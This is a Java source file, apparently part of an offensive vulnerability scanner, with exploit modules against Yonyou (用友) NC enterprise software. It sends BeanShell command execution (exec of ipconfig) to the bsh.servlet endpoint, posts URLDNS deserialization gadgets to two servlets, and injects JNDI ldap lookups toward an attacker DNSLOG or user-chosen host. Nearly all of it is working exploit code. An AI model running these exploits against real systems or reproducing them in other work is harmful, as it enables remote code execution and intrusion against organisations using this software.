package com.achuna33.Controllers;

import java.net.MalformedURLException;
import java.rmi.server.ExportException;

import com.achuna33.Gadgets.URLDNS;
import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.UI.UIController;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.DNSLOG;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.alibaba.fastjson.JSON;
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.cli.JavaURLCommunicator;
import org.springframework.http.converter.feed.RssChannelHttpMessageConverter;


@BasicMapping(uri = "用友")
public class YongyouController extends Controller implements BasicController{
    public YongyouController(){

    }

    @VulnerabilityDescriptionMapping(Description="servlet/~ic/bsh.servlet.BshServlet 可以执行脚本。" ,SupportVulType= SupportVul.RuntimeExec)
    public void vul_Beanshell(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        switch (type){
            case EXP:
            case POC:
               HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Post("bsh.script=exec(\"ipconfig\");");
                if(result.responseBody.contains("DNS")){
                    WriteLog(" 存在漏洞");
                }else {
                    WriteLog(" 不存在漏洞");
                }
                WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Serial)
    public void vul_ResourceManagerServlet(Poc_Exp type,String target,Object... args) throws Exception {

        Cache.uiController.logTextArea.appendText("vul_ResourceManagerServlet");
        switch (type){
            case EXP:
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                Object object = URLDNS.getObject("http://"+domain);

                target = target+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";
                HttpRequest httpRequest = new HttpRequest(target);
                httpRequest.addHeaders("Content-Type","");
                httpRequest.Post(object);

                WriteLog("请自行判断是否成功。"+domain);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Serial)
    public void vul_XbrlPersistenceServlet(Poc_Exp type,String target,Object... args) throws Exception {
        Cache.uiController.logTextArea.appendText("vul_ResourceManagerServlet");
        switch (type){
            case EXP:
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                Object object = URLDNS.getObject("http://"+domain);

                target = target + "/service/~xbrl/XbrlPersistenceServlet";
                HttpRequest httpRequest = new HttpRequest(target);
                httpRequest.addHeaders("Content-Type","");
                httpRequest.Post(object);

                WriteLog("请自行判断是否成功。"+domain);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Jndi)
    public void vul_LoginJndi(Poc_Exp type,String target,Object... args){
        Cache.uiController.logTextArea.appendText("vul_LoginJndi");
        switch (type) {
            case EXP:
                try {
                    InvocationInfo info = new InvocationInfo();
                    info.setServiceName((String) args[0]);
                    JavaURLCommunicator com = new JavaURLCommunicator();
                    target = target + "/service/~xbrl/XbrlPersistenceServlet";

                    com.request(info,target);
                }catch (Exception e){
                    WriteExpLog("请自行判断是否成功。"+DNSLOG.domain);
                }
            case POC:
                try {
                    InvocationInfo info = new InvocationInfo();
                    if (Cache.uiController.DNSDomain.getText().equals("")){
                        WriteLog("DNS验证类型漏洞 请配置 DNSLOG 地址");
                        return;
                    }else {
                        DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                    }
                    String domain = DNSLOG.getRandomDomain();
                    info.setServiceName("ldap://"+domain);
                    JavaURLCommunicator com = new JavaURLCommunicator();
                    target = target + "/service/~xbrl/XbrlPersistenceServlet";

                    com.request(info,target);
                }catch (Exception e){
                    WriteLog("请自行判断是否成功。"+DNSLOG.domain);
                }
        }

    }

}
